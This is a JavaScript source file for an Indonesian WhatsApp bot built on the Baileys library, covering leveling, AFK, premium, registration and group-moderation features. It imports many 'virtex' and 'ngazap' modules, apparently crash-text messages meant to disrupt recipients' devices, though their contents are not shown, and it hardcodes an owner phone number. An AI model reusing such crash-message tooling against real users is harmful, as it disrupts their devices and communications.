// ᴛʜᴀɴᴋ ᴛᴏ
// ʙʟᴀᴄᴋʜᴜɴᴛᴇʀsᴇᴄ
// ʀᴏɴᴏᴠᴇ
// ᴠɪɴᴢ
// ᴠᴀɴʏ
// ᴀʟʟ ᴄʀᴇᴀᴛᴏʀ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ
const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ReclientectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const { virtex, vipi } = require("./lib/virtex.js"); //memans
const hx = require("hxz-api");
const yo = require("tod-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const { EmojiAPI } = require("emoji-api");
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const FormData = require("form-data");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const got = require("got");
const imageToBase64 = require
("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const crypto = require('crypto')
const brainly = require("brainly-scraper");
const yts = require("yt-search");
const ms = require("parse-ms");
const toMs = require("ms");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");
const { color, bgcolor } = require("./lib/color");
const { virtex90 } = require('./virtex/virtex90')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { mediafireDl } = require('./lib/mediafire.js');
const { yta, ytv, ytyt, igdl, upload, formatDate } = require("./lib/ytdl");
const { ythd } = require('./lib/ytdl')
const premium = require("./lib/premium");
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/library/badword");
const afk = require("./lib/afk");
const level = require("./lib/level");
const atm = require("./lib/atm");
const _sewa = require("./lib/sewa");
const { webp2mp4File } = require("./lib/webp2mp4");
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js");
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const { addVote, delVote } = require("./lib/vote");
const reminder = require("./lib/reminder");
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let _afk = JSON.parse(fs.readFileSync('./database/user/afk.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
let sewa = JSON.parse(fs.readFileSync('./database/group/sewa.json'));
let _premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let _uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const reg = JSON.parse(fs.readFileSync('./database/register.json'))
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
const truth = JSON.parse(fs.readFileSync('./database/truth.json'))
const setting = JSON.parse(fs.readFileSync("./setting.json"));
const dare = JSON.parse(fs.readFileSync('./database/dare.json'))
// BATAS IMAGE FOLDER //
const serlok = fs.readFileSync('./stik/serlok.jpg')
const iye = fs.readFileSync('./stik/thumb.jpeg')
const lepell = fs.readFileSync('./stik/lepel.jpg')
const asw1 = 'https://f.top4top.io/p_2073p4mwa0.jpg'
const sip = fs.readFileSync('./stik/oksip.jpeg')
const bgg = fs.readFileSync('./stik/fake.jpeg')
//// Image ////
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja🌞";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore🌄";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang☀️";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi🌅";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam🌃";
    }
 
 // BATAS \\
banChats = false;
offline = false;
antidel = true,
antical = true
readGc = false; 
readPc = false;
autovn = true;
multi = true
harga = 0
matauang = 'YEN'
nopref = false
numbernye = '0'
autoketik = false;
prefixStatus = true;
namabot = setting.botName
targetpc = setting.targetpc
owner = setting.owner
namaowner = setting.ownerName
nok = 'Root@OiBoySecLinux'
HunterApi = setting.HunterApi
xchillds = setting.xchillds
hardi = setting.hardi
valkey = setting.valkey
lolkey = setting.lolkey
xteamkey = setting.xteamkey
zekskey = setting.zekskey
dapapi = setting.dapapi
autongevn = setting.autongevn
bentar = setting.bentar
fake = setting.fake
thumb = fs.readFileSync("./stik/thumb.jpeg");
numbernye = "0"; 
waktu = "-";
alasan = "-"; 
menuslow = false;
autojoin = false;
cmhit = []
hit_today = [];
//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));

// Sticker Cmd Fix ${namaowner}
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};

const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
function monospace(string) {
return '```' + string + '```'
}   
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = ronove = async (ronove, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
const typei = Object.keys(mek.message)[0]
const type = Object.keys(mek.message)[0]
let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		
if (multi){
		    var prefix =/^[°zZ#@x*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#@x*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '#'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      contactsArray,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
   
const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
    const q = args.join(" ");
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const botNumber = ronove.user.jid;
    
    const botNumberss = ronove.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");

    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );

const grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));    
const badword = JSON.parse(fs.readFileSync('./database/badword.json'));
const senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
    const bancht = JSON.parse(fs.readFileSync('./database/banchat.json'));
    const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isNsfw = isGroup ? nsfww.includes(from) : false
const senderkey = mek.key.fromMe
      ? ronove.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
      const isBadword = isGroup ? grupbadword.includes(from) : false
      const isSewa = _sewa.checkSewaGroup(from, sewa)
const isPremium = premium.checkPremiumUser(senderkey, _premium)
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const senderir = mek.key.fromMe
      ? ronove.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    const isAfkOn = afk.checkAfkUser(senderir, _afk)
    const isLevelingOn = isGroup ? _leveling.includes(from) : false
    const isAntilink = isGroup ? antilink.includes(from) : false;
// Auto Read Group 
var ampun = await ronove.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await ronove.chatRead(jid)
})
// Auto Read Private 
var chatss = await ronove.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await ronove.chatRead(jid)
})
if (autovn) {
	if (autovn === false) return
await ronove.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await ronove.updatePresence(from, Presence.composing)
}
const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
    const sender = mek.key.fromMe
      ? ronove.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? ronove.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    const totalchat = await ronove.chats.all();
    const ownerNumber = [`6285347683869@s.whatsapp.net`]
	const senderNumber = sender.split("@")[0] 
    const m = simple.smsg(ronove, mek);
    const groupMetadata = isGroup ? await ronove.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const itsMe = mek.key.fromMe ? true : false
const isRegistered = checkRegisteredUser(sender)
   const isRegister = register.includes(sender)
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const isOwner = ownerNumber.includes(sender)
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const hour_now = moment().format('HH:mm:ss')
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isBanchat = isGroup ? bancht.includes(from) : false
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = mek.key.fromMe
      ? ronove.user.jid
      : ronove.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? ronove.user.name
      : conts.notify || conts.vname || conts.name || "-";
    const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;
          const levelRole = level.getLevelingLevel(sender, _level)
        var role = 'Warrior III'
        if (levelRole <= 5) {
            role = 'Warrior II'
        } else if (levelRole <= 10) {
            role = 'Warrior I'
        } else if (levelRole <= 15) {
            role = 'Elite III'
        } else if (levelRole <= 20) {
            role = 'Elite II'
        } else if (levelRole <= 25) {
            role = 'Elite I'
        } else if (levelRole <= 30) {
            role = 'Master III'
        } else if (levelRole <= 35) {
            role = 'Master II'
        } else if (levelRole <= 40) {
            role = 'Master I'
        } else if (levelRole <= 45) {
            role = 'GrandMaster III'
        } else if (levelRole <= 50) {
            role = 'GrandMaster II'
        } else if (levelRole <= 55) {
            role = 'GrandMaster I'
        } else if (levelRole <= 60) {
            role = 'Epic III'
        } else if (levelRole <= 65) {
            role = 'Epic II'
        } else if (levelRole <= 70) {
            role = 'Epic I'
        } else if (levelRole <= 75) {
            role = 'Legend III'
        } else if (levelRole <= 80) {
            role = 'Legend II'
        } else if (levelRole <= 85) {
            role = 'Legend I'
        } else if (levelRole <= 90) {
            role = 'Mythic'
        } else if (levelRole <= 95) {
            role = 'Mythical Glory'
        } else if (levelRole >= 100) {
            role = 'Immortal'
        }
                  ///////PREMIUM BY IKY
      const prem1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\n Fitur Ini Khusus Member Premium Silahkan Buy Premium Untuk Menggunakan Fitur Ini `
       const prem2 = `KLIK TOMBOL DI BAWAH UNTUK MELIHAT LIST PREMIUM\n ${namabot}☕`
       const prem3 = [
          {
            buttonId: `buy`,
            buttonText: {
              displayText: `⬡ BUY PREMIUM `,
            },
            type: 1,
          },]
        //daftar button by Iky hooh
      const daftar1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\nSebelum Menggunakan Bot Verify Terlebih Dahulu Ya `
       const daftar2 = '```Ketik 1998/ Tekan Tombol Di Bawah Untuk Verify Kak〆⁩```'
       const daftar3 = [
          {
            buttonId: `verify`,
            buttonText: {
              displayText: `Daftar〆⁩`,
            },
            type: 1,
          },]
var hayuk0 = '[NOT VERIFIED]'
			if (isRegistered) {
			hayuk0 = '[√ VERIFIED]'
			}
			       // FUNCTION LEVELING
       if (isGroup && !mek.key.fromMe && !level.isGained(sender) && isLevelingOn) {
       try {
       level.addCooldown(sender)
       const checkATM = atm.checkATMuser(sender, _uang)
       if (checkATM === undefined) atm.addATM(sender, _uang)
       const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       atm.addKoinUser(sender, uangsaku, _uang)
       const reply = (teks) => {
      ronove.sendMessage(from, teks, text, { quoted: mek });
    };
       const currentLevel = level.getLevelingLevel(sender, _level)
       const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
       level.addLevelingXp(sender, amountXp, _level)
       if (requiredXp <= level.getLevelingXp(sender, _level)) {
       level.addLevelingLevel(sender, 1, _level)
       const userLevel = level.getLevelingLevel(sender, _level)
       const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
       reply(`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongrats!! 🎉🎉`)
} 
       } catch (err) {
       console.error(err)
}
}
//////
			let Levelnye = level.getLevelingLevel(sender, _level)
              let Xpluu = level.getLevelingXp(sender, _level)
              let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100
			tc = `MAAF KA NOMER KAMU BLOM TERDAFTAR DI DATABASE SILAHKAN KETIK !verify UNTUK MENDAFTAR DI DIDINBOT☕`
			ind = {
				wait: `⌛ Sedang di Prosess ⌛`,
				success: `✔️ Berhasil ✔️`,
				levelnol: `*LEVEL KAKAK KOK MASIH * 0 >_<`,
				me: `「 *REMOTE* 」Fitur Ini khusus Nomor Yang Di Scan.`,
				error: {
					stick: `❌ Gagal, terjadi kesalahan saat mengkonversi gambar ke sticker ❌`,
					Iv: `❌ Link tidak valid ❌`
				},
				only: {
					}
			}
			
			////////// AFK
ky_ttt = []
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
}
const senderh = mek.key.fromMe
      ? ronove.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
	if (isGroup) {
		if (!banChats === false) return
		for (let x of mentionUser) {
		    if (afk.checkAfkUser(x, _afk)) {
			const getId = afk.getAfkId(x, _afk)
			const getReason = afk.getAfkReason(getId, _afk)
			const getTime = afk.getAfkTime(getId, _afk)
			const cptl = `*「 AFK MODE 」*\n
*Sssttt! Orangnya lagi AFK, jangan diganggu!*
➸ *Alasan*  : ${getReason}
➸ *Sejak* : ${getTime}`
      mentions(cptl, x, true)
    }}
		if (afk.checkAfkUser(senderh, _afk) && !isCmd) {
		    const getTime = afk.getAfkTime(senderh, _afk)
		    const getReason = afk.getAfkReason(senderh, _afk)
		    const ittung = ms(await Date.now() - getTime)
		const repluy = (teks) => {
      ronove.sendMessage(from, teks, text, { quoted: mek });
    };
		    const pep = `*${pushname}* telah kembali dari AFK! Selamat datang kembali~`
		    repluy(pep)
		    _afk.splice(afk.getAfkPosition(senderh, _afk), 1)
		    fs.writeFileSync('./database/user/afk.json', JSON.stringify(_afk))
		}
	    }
    //Y
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let locale = "id";
    let d = new Date();
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
cmhit.push(command)
    //MESS
    mess = {
        noregis: "daftar dulu kakak",
      wait: "Mohon Tunggu Sebentar 『⏳』",
      success: "Berhasil!",
      wrongFormat: "Format salah, coba liat lagi di menu",
      error: {
        stick: "bukan sticker itu:(",
        apiz: "Nulisnya Jan Kepanjangan Erorkan",
        Iv: "Linknya error kakak:(",
      },
      only: {
        group: "Khusus grup ngab",
      },
    };
      function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }
            const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
